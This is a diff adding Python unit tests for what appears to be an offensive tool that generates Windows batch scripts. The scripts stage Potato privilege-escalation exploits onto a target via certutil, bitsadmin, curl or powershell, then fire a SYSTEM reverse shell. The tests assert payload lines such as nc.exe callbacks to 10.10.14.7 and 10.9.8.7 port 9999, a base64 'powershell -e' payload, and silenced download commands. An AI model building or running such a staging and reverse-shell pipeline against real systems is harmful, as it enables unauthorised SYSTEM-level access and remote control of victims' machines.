@@ -153,6 +153,114 @@ class GenPotatoScan_Stage(unittest.TestCase):
             self.assertNotIn("=== SCAN ===", out)
 
 
+class GenPotatoScan_Fire(unittest.TestCase):
+    """--fire: after scan finds a winner, batch runs the SYSTEM revshell via it."""
+
+    def test_fire_flag_adds_fire_phase_and_winner_pick_logic(self):
+        with tempfile.TemporaryDirectory() as d:
+            for n in ("EfsPotato.exe", "GodPotato-NET4.exe"):
+                with open(os.path.join(d, n), "wb") as fh:
+                    fh.write(b"MZ" + b"\x00" * 2048)
+            out, _ = _run("--serve-dir", d, "--fire")
+            self.assertIn("=== FIRE ===", out)
+            # Winner-picking: batch takes first token of !WINNERS! into !FIRST!
+            self.assertIn('tokens=1', out)
+            self.assertIn("set FIRST=", out)
+            # One fire block per staged tool with runtime IF on !FIRST!:
+            self.assertIn('if /I "!FIRST!"=="EfsPotato.exe"', out)
+            self.assertIn('if /I "!FIRST!"=="GodPotato-NET4.exe"', out)
+
+    def test_fire_nc_mode_stages_nc_exe_and_uses_it_in_payload(self):
+        # --revtype nc + local nc.exe -> nc.exe gets its own stage block and the
+        # fire payload uses %STAGE%\nc.exe as the callback.
+        with tempfile.TemporaryDirectory() as d:
+            for n in ("EfsPotato.exe", "nc.exe"):
+                with open(os.path.join(d, n), "wb") as fh:
+                    fh.write(b"MZ" + b"\x00" * 2048)
+            out, _ = _run("--serve-dir", d, "--fire", "--revtype", "nc")
+            self.assertIn("STAGE nc.exe", out)
+            self.assertIn("nc.exe 10.10.14.7", out)  # payload references nc callback
+            self.assertIn("(nc callback)", out)
+
+    def test_fire_powershell_mode_does_not_stage_nc_exe(self):
+        # --revtype powershell -> nc.exe is NOT staged even if present locally.
+        with tempfile.TemporaryDirectory() as d:
+            for n in ("EfsPotato.exe", "nc.exe"):
+                with open(os.path.join(d, n), "wb") as fh:
+                    fh.write(b"MZ" + b"\x00" * 2048)
+            out, _ = _run("--serve-dir", d, "--fire", "--revtype", "powershell")
+            self.assertNotIn("STAGE nc.exe", out)
+            self.assertIn("powershell -e", out)      # PS revshell b64 payload
+            self.assertIn("(powershell callback)", out)
+
+    def test_fire_lhost_lport_override_flows_into_payload(self):
+        # --lhost / --lport must override the module defaults in the fire payload.
+        with tempfile.TemporaryDirectory() as d:
+            for n in ("EfsPotato.exe", "nc.exe"):
+                with open(os.path.join(d, n), "wb") as fh:
+                    fh.write(b"MZ" + b"\x00" * 2048)
+            out, _ = _run("--serve-dir", d, "--fire", "--revtype", "nc",
+                          "--lhost", "10.9.8.7", "--lport", "9999")
+            self.assertIn("nc.exe 10.9.8.7 9999", out)
+
+    def test_fire_no_stage_warning_and_still_valid(self):
+        # --fire --no-stage: valid combo (assume everything already on target).
+        out, err = _run("--fire", "--no-stage", "--revtype", "nc")
+        self.assertIn("=== FIRE ===", out)
+        # Warns on stderr about the assumption:
+        self.assertIn("assumes", err)
+
+
+class GenPotatoScan_TransportsAndErrors(unittest.TestCase):
+    """--transport <name>, --verbose, per-attempt [TRIED via X] visibility."""
+
+    def test_transport_flag_reorders_preference(self):
+        # --transport curl moves curl to first, others follow in default order.
+        with tempfile.TemporaryDirectory() as d:
+            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
+                fh.write(b"MZ" + b"\x00" * 2048)
+            out, _ = _run("--serve-dir", d, "--transport", "curl")
+            self.assertIn("transport order: curl -> certutil -> bitsadmin -> powershell", out)
+            # And the stage block's first attempt is actually curl:
+            i_curl = out.index("where curl")
+            i_cert = out.index("certutil -urlcache -f %BASE%/EfsPotato")
+            self.assertLess(i_curl, i_cert)
+
+    def test_verbose_strips_null_redirects_from_stage_attempts(self):
+        # Default: `certutil ... >nul 2>&1` (silent). Verbose: no redirect so
+        # the operator sees each transport's error output.
+        with tempfile.TemporaryDirectory() as d:
+            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
+                fh.write(b"MZ" + b"\x00" * 2048)
+            quiet, _ = _run("--serve-dir", d)
+            loud, _ = _run("--serve-dir", d, "--verbose")
+            # In quiet mode the stage certutil line has the redirect suffix:
+            for ln in quiet.splitlines():
+                if ln.startswith("certutil -urlcache -f %BASE%/EfsPotato"):
+                    self.assertIn(">nul 2>&1", ln)
+                    break
+            else:
+                self.fail("no stage certutil emission in quiet mode")
+            # In verbose mode the same line has no redirect:
+            for ln in loud.splitlines():
+                if ln.startswith("certutil -urlcache -f %BASE%/EfsPotato"):
+                    self.assertNotIn(">nul 2>&1", ln)
+                    break
+            else:
+                self.fail("no stage certutil emission in verbose mode")
+
+    def test_every_transport_attempt_emits_tried_diagnostic(self):
+        # [TRIED via X: exit=N bytes=M] must appear after every transport attempt
+        # (4 transports x 1 tool = 4 diagnostics minimum).
+        with tempfile.TemporaryDirectory() as d:
+            with open(os.path.join(d, "EfsPotato.exe"), "wb") as fh:
+                fh.write(b"MZ" + b"\x00" * 2048)
+            out, _ = _run("--serve-dir", d)
+            self.assertGreaterEqual(out.count("[TRIED via"), 4)
+            for tr in ("certutil", "bitsadmin", "curl", "powershell"):
+                self.assertIn(f"[TRIED via {tr}", out)
+
+
 class GenPotatoScan_Shared(unittest.TestCase):
     """Behavior shared across both modes: flags that flow through unchanged."""
 
